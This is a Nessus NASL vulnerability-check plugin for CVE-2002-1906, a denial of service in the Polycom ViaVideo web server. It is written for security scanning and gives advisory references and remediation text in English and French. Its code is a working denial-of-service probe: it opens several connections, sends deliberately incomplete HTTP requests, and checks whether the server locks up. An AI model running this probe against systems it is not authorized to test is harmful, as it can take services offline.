#
# This script was written by Michel Arboi <arboi@alussinan.org>
# It is released under the GNU Public Licence (GPLv2)
#
########################
# References:
########################
# 
# Date:	 Mon, 14 Oct 2002 08:27:54 +1300 (NZDT)
# From:	advisory@prophecy.net.nz
# To:	bugtraq@securityfocus.com
# Subject: Security vulnerabilities in Polycom ViaVideo Web component
#
########################

if(description)
{
 script_id(11825);
 script_cve_id("CVE-2002-1906");
 script_bugtraq_id(5962);
 script_version ("$Revision: 1.10 $");
 #script_cve_id();
 
 name["english"] = "Polycom ViaVideo denial of service";
 script_name(english:name["english"]);
 
 desc["english"] = 
"The remote web server locks up when several incomplete web 
requests are sent and the connections are kept open.

Some servers (e.g. Polycom ViaVideo) even run an endless loop, 
using much CPU on the machine. Nessus has no way to test this, 
but you'd better check your machine.

Solution : Contact your vendor for a patch
Risk factor : High

Solution : Upgrade your web server";

 desc["francais"] = 
"Le server web  se fige quand on lui envoie plusieurs requêtes 
HTTP incomplètes tout en gardant les connexions ouvertes.

Certains serveurs (par exemple Polycom ViaVideo) partent même dans
une boucle infinie, consommant trop de CPU sur la machine. Nessus ne
peut pas tester celà, mais vous devriez vérifier votre machine.


Facteur de risque : Elevé

Solution : Mettez à jour votre serveur web.";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Several incomplete HTTP requests lock the server";
 summary["francais"] = "Plusieurs requêtes HTTP incomplètes verrouillent le serveur";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi",
		francais:"Ce script est Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie('http_version.nasl', 'httpver.nasl', 'www_multiple_get.nasl');
 script_require_ports("Services/www",80);
 exit(0);
}

#

include('global_settings.inc');
include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);


if(http_is_dead(port:port))exit(0);

# 4 is enough for Polycom ViaVideo

# Try to avoid FP on CISCO 7940 phone
max = get_kb_item('www/multiple_get/'+port);
if (max)
{
 imax = max * 2 / 3;
 if (imax < 1)
  imax = 1;
 else if (imax > 5)
  imax = 5;
}
else
 imax = 5;

n = 0;
for (i = 0; i < imax; i++)
{
  soc[i] = http_open_socket(port);
  if(soc[i])
  {
    n ++;
    req = http_get(item:"/", port:port);
    req -= '\r\n';
    send(socket:soc[i], data:req);
  }
}

debug_print(n, ' connections on ', imax, ' were opened\n');

dead = 0;
if(http_is_dead(port: port, retry:1)) dead ++;

for (i = 0; i < imax; i++)
  if (! isnull(soc[i]))
    http_close_socket(soc[i]);

if(http_is_dead(port: port, retry:1)) dead ++;

if (dead == 2)
  security_hole(port);
else if (dead == 1)
{
  report=
"The remote web server locks up when several incomplete web 
requests are sent and the connections are kept open.

However, it runs again when the connections are closed.

Solution : Contact your vendor for a patch
Risk factor : Medium

Solution : Upgrade your web server";

  security_hole(port: port, data: report);
}
